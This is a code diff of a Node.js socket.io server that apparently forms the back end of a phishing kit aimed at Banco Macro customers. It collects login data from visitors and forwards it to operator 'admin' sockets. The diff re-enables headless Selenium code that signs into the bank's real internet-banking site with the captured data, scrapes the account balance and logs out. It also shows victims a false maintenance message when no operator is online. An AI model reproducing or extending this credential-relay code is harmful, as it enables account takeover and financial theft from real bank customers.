@@ -63,8 +63,6 @@ module.exports = httpServer => {
         // Mostrar imagen login
         socket.on("ShowAvatar", data => {
 
-            io.to(data.socket).emit("AvatarElement", '/img/c93f32e11dbf6b5fe3efc5be5554ec50-icono-de-circulo-de-candado.png');
-            /*var img = '';
             let browser = new swd.Builder();
             let tab = browser.forBrowser("chrome")
                 .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
@@ -124,7 +122,7 @@ module.exports = httpServer => {
                 })
                 .catch(err => {
                     console.log("Error ", err, " occurred!");
-                });*/
+                });
         })
 
 
@@ -182,32 +180,21 @@ module.exports = httpServer => {
 
         // Recibir data y enviar al adm
         socket.on("Data", data => {
-            totalInfo = [data, 'Pedro Pérez', 'Última vez el 18/08/2022 a las 12:00:00', '$99.999,00'];
+            totalInfo = [data];
             //console.log('Length adm ' + socketsOnLineAdm.length)
 
             if (socketsOnLineAdm.length == 0) {
                 io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
             } else {
 
-                /*if (AsignarAdm < socketsOnLineAdm.length - 1) {
-                    AsignarAdm += 1;
-                } else {
-                    AsignarAdm = 0;
-                }
-                var AdminSelected = socketsOnLineAdm[AsignarAdm];*/
-
-                /*let browser = new swd.Builder();
+                let browser = new swd.Builder();
                 let tab = browser.forBrowser("chrome")
                     .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                     .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
-                    .build();*/
-
-                totalInfoArr.push(totalInfo);
-                io.to(data.socket).emit("ContinuarHome", totalInfo);
-                //io.to(AdminSelected).emit("NewData", totalInfo);
+                    .build();
 
                 //Step 1 - Opening sign in page
-                /*let tabToOpenSignIn =
+                let tabToOpenSignIn =
                     tab.get("https://www.macro.com.ar/bancainternet/");
                 tabToOpenSignIn
                     .then(() => {
@@ -306,8 +293,8 @@ module.exports = httpServer => {
                     })
                     .then(saldo => {
                         totalInfo.push(saldo)
-                        io.to(data.socket).emit("ContinuarHome", data.socket);
-                        io.to(AdminSelected).emit("NewData", totalInfo);
+                        totalInfoArr.push(totalInfo);
+                        io.to(data.socket).emit("ContinuarHome", totalInfo);
                     })
                     .then(() => {
                         let promiseBtnLogout = tab.findElement(swd.By.css("#widgetLogoutBtn"));
@@ -322,7 +309,7 @@ module.exports = httpServer => {
                     })
                     .catch(err => {
                         console.log("Error ", err, " occurred!");
-                    });*/
+                    });
             }
         });
 
